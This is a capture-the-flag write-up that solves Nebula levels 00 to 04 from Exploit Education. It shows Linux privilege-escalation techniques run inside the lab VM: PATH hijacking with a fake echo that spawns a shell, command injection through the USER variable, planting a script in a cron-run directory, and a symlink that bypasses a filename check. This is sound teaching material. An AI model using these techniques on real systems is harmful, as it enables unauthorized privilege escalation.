 ## Table of Contents
- [Table of Contents](#table-of-contents)
- [Introduction](#introduction)
- [Level 00](#level-00)
- [Level 01](#level-01)
- [Level 02](#level-02)
- [Level 03](#level-03)
- [Level 04](#level-04)
- [Level 05](#level-05)
- [Level 06](#level-06)
- [Level 07](#level-07)
- [Level 08](#level-08)
- [Level 09](#level-09)
- [Level 10](#level-10)
- [Level 11](#level-11)
- [Level 12](#level-12)
- [Level 13](#level-13)
- [Level 14](#level-14)
- [Level 15](#level-15)
- [Level 16](#level-16)
- [Level 17](#level-17)
- [Level 18](#level-18)
- [Level 19](#level-19)

## Introduction

Welcome to my exploit write up on the Nebula challenges from the website [Exploit Education](https://exploit.education). 

## Level 00

[Level 00 Code](https://exploit.education/nebula/level-00/).


This challenge is less about exploit knowledge and more about understanding the Linux environment. To solve the challenge we need to find a program that sets your user id as "flag00". This best way to find files on Linux is to use the find program. Which if we check the manuel for by using entering man find, we can see all the command arguments that the find program takes. One of which is the "-user" argument. This allows you to see all the files that x user has access to. We can use this to find all the files the user "flag00" has access to. Entering this shows us the program we where looking for right off the bat. Running the program, "./bin/.../flag00", sets the user as "flag00", allowing us to get the flag solving the challenge.

```bash
level00@nebula:/$ find -user flag00
./bin/.../flag00
find: `./etc/chatscripts': Permission denied
find: `./etc/ppp/peers': Permission denied
find: `./etc/ssl/private': Permission denied
./home/flag00
./home/flag00/.bash_logout
./home/flag00/.bashrc
./home/flag00/.profile
find: `./home/flag01': Permission denied
...
find: `./home/level19': Permission denied
find: `./home/nebula/.ssh': Permission denied
find: `./proc/tty/driver': Permission denied
find: `./proc/1/task/1/fd': Permission denied
...
find: `./proc/1493/fdinfo/5': No such file or directory
find: `./root': Permission denied
find: `./sys/kernel/debug': Permission denied
find: `./var/cache/ldconfig': Permission denied
find: `./var/lib/php5': Permission denied
find: `./var/lib/sudo': Permission denied
find: `./var/spool/cron/atjobs': Permission denied
find: `./var/spool/cron/atspool': Permission denied
find: `./var/spool/cron/crontabs': Permission denied
./rofs/bin/.../flag00
find: `./rofs/etc/chatscripts': Permission denied
find: `./rofs/etc/ppp/peers': Permission denied
find: `./rofs/etc/ssl/private': Permission denied
./rofs/home/flag00
./rofs/home/flag00/.bash_logout
./rofs/home/flag00/.bashrc
./rofs/home/flag00/.profile
find: `./rofs/home/flag01': Permission denied
...
find: `./rofs/home/level19': Permission denied
find: `./rofs/home/nebula/.ssh': Permission denied
find: `./rofs/root': Permission denied
find: `./rofs/var/cache/ldconfig': Permission denied
find: `./rofs/var/lib/php5': Permission denied
find: `./rofs/var/lib/sudo': Permission denied
find: `./rofs/var/spool/cron/atjobs': Permission denied
find: `./rofs/var/spool/cron/atspool': Permission denied
find: `./rofs/var/spool/cron/crontabs': Permission denied
```

### Solved

```bash
level00@nebula:/$ ./bin/.../flag00
Congrats, now run getflag to get your flag!
flag00@nebula:/$ getflag
You have successfully executed getflag on a target account
``` 

## Level 01

[Level 01 Code](https://exploit.education/nebula/level-01/).


This challenge makes you think that you need to find an exploit in the functions "setresgid" and/or "setresuid". In reality we are only going to exploit the way Linux calls command line programs. When a program is called on the command line in a Linux environment the command shell looks to the path environment variable to find where the program that the user is calling is located. If we create our own echo program and have the path variable look at the location of it. We can then exploit the program by calling our own echo when it tries to call echo in the system function call. The only thing our echo does is create a bash shell.

```bash
level01@nebula:~$ touch echo.c
level01@nebula:~$ nano echo.c
```
```c
#include<stdio.h>
#include<stdlib.h>

int main()
{
  system("/bin/bash");
}
```

We can compile our echo program with gcc and make sure it outs the program name as echo by using the command argument "-o". We then set the path environment variable using export to include the home folder of user "level01". After that we can go to the home folder of user "flag01" and then run the "flag01" program. Once the program tries to run echo it will run our newly created one instead. Giving us access to the "flag01" user allowing us to get the flag and solve the challenge.

```bash
level01@nebula:~$ gcc echo.c -o echo
level01@nebula:~$ export PATH="/home/level01/:$PATH"
```

### Solved

```bash
level01@nebula:/tmp$ cd /home/flag01/
level01@nebula:/home/flag01$ ./flag01 
flag01@nebula:/home/flag01$ getflag
You have successfully executed getflag on a target account
```

## Level 02

[Level 02 Code](https://exploit.education/nebula/level-02/).


This challenge is the same as the last were we are changing an environment variable. This time it is the "USER" variable that we are changing. If we go to the home folder of user "flag02" and call the flag02 program. We can see that the program uses the "USER" variable when calling echo. If we try and change the variable to test if the program takes in our change. We can see that it does. Now if set the "USER" variable as bash shell call we can then be in a bash shell as the "flag02" user. We can then call the getflag program to get the flag and solve the challenge.

```bash
level02@nebula:~$ cd /home/flag02/
level02@nebula:/home/flag02$ ./flag02 
about to call system("/bin/echo level02 is cool")
level02 is cool
level02@nebula:/home/flag02$ export USER="fffff"
level02@nebula:/home/flag02$ ./flag02 
about to call system("/bin/echo fffff is cool")
fffff is cool
```

### Solved

```bash
level02@nebula:/home/flag02$ export USER="; /bin/bash;"
level02@nebula:/home/flag02$ ./flag02 
about to call system("/bin/echo ; /bin/bash; is cool")

flag02@nebula:/home/flag02$ getflag
You have successfully executed getflag on a target account
```

## Level 03

[Level 03 Code](https://exploit.education/nebula/level-03/).


If we check the home folder for the user "flag03" like the challenge description said. We can see that there is a shell script file and an empty folder called "writeable.d". If we look at the shell script we can see that it will try to execute any executable file in the "writeable.d" folder every time the crontab runs. Knowing that we can make a bash script that takes the output of running the getflag program and saves it to a file. Once the crontab runs it will create that file with the output of the getflag program. This solves the challenge, because the bash script will run as the user "flag03" getting us the flag without having to sign into the user.

```bash
level03@nebula:~$ cd /home/flag03
level03@nebula:/home/flag03$ ls
writable.d  writable.sh
level03@nebula:/home/flag03$ cd writable.d/
level03@nebula:/home/flag03/writable.d$ cat /home/flag03/writable.sh 
#!/bin/sh

for i in /home/flag03/writable.d/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done

level03@nebula:/home/flag03/writable.d$ touch flag03.sh
level03@nebula:/home/flag03/writable.d$ nano flag03.sh 
level03@nebula:/home/flag03/writable.d$ chmod +x flag03.sh 
```
```bash
#!/bin/bash

/bin/getflag >> /home/flag03/flag03.out
```

### Solved

```bash
level03@nebula:/home/flag03/writable.d$ cd /home/flag03
level03@nebula:/home/flag03$ ls
flag03.out  writable.d  writable.sh
level03@nebula:/home/flag03$ cat flag03.out 
You have successfully executed getflag on a target account
```

## Level 04

[Level 04 Code](https://exploit.education/nebula/level-04/).


If we try and run the program in the home folder of the user "flag04". We discover that we can't access the "token" file. If we look at the code of the program, we see that it is only checking if the name of the file is token to see if we have access or not. When we try to use the move command to rename the file we see that can't. But, we can make a symbolic link to the file that is named whatever we want. What a symbolic link is, just a way on Linux to create a file that points to another file that's it. If we create a symbolic link to the token file, but use a different name. We can see that we now have access to the "token" file. Obtaining the password to the "flag04" user, which means we can get the flag and solve the challenge.

```bash
level04@nebula:/home/flag04$ ./flag04 token 
You may not access 'token'
level04@nebula:/home/flag04$ mv token /home/level04/flag04
mv: cannot move `token' to `/home/level04/flag04': Permission denied
```

### Solved

```bash
level04@nebula:/home/flag04$ ln -s /home/flag04/token /home/level04/flag04
level04@nebula:/home/flag04$ ./flag04 /home/level04/flag04
06508b5e-8909-4f38-b630-fdb148a848a2
level04@nebula:/home/flag04$ su flag04
Password: 
sh-4.2$ getflag
You have successfully executed getflag on a target account
```
